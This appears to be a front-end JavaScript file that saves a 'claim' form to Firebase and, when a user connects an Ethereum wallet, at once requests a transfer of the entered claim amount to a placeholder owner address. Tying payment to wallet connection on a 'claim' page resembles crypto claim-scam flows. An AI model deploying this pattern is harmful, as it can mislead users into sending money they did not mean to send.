// Initialize Firebase
const firebaseConfig = {
    apiKey: "YOUR_API_KEY",
    authDomain: "YOUR_AUTH_DOMAIN",
    projectId: "YOUR_PROJECT_ID",
    storageBucket: "YOUR_STORAGE_BUCKET",
    messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
    appId: "YOUR_APP_ID"
};
firebase.initializeApp(firebaseConfig);

const db = firebase.firestore();

// Handle form submission
const claimForm = document.getElementById('claimForm');
claimForm.addEventListener('submit', async (e) => {
    e.preventDefault();

    const name = document.getElementById('name').value;
    const email = document.getElementById('email').value;
    const claimAmount = document.getElementById('claimAmount').value;

    // Store the claim data in Firebase
    await db.collection('claims').add({
        name,
        email,
        claimAmount,
        timestamp: new Date()
    });

    alert("Claim submitted successfully!");
    claimForm.reset();
});

// Ethereum Wallet Integration
let web3;
const connectWalletBtn = document.getElementById('connectWalletBtn');
const walletAddressDisplay = document.getElementById('walletAddress');

connectWalletBtn.addEventListener('click', async () => {
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        try {
            // Request account access
            const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
            const walletAddress = accounts[0];
            walletAddressDisplay.innerText = `Connected Wallet: ${walletAddress}`;

            // Handle Ethereum transaction (for claim payments)
            const claimAmount = document.getElementById('claimAmount').value;
            if (claimAmount) {
                await web3.eth.sendTransaction({
                    from: walletAddress,
                    to: 'YOUR_ETHEREUM_WALLET_ADDRESS',
                    value: web3.utils.toWei(claimAmount, 'ether')
                });
                alert('Payment successful!');
            }

        } catch (error) {
            console.error("Error connecting to wallet", error);
        }
    } else {
        alert('Please install MetaMask or another Ethereum wallet extension.');
    }
});
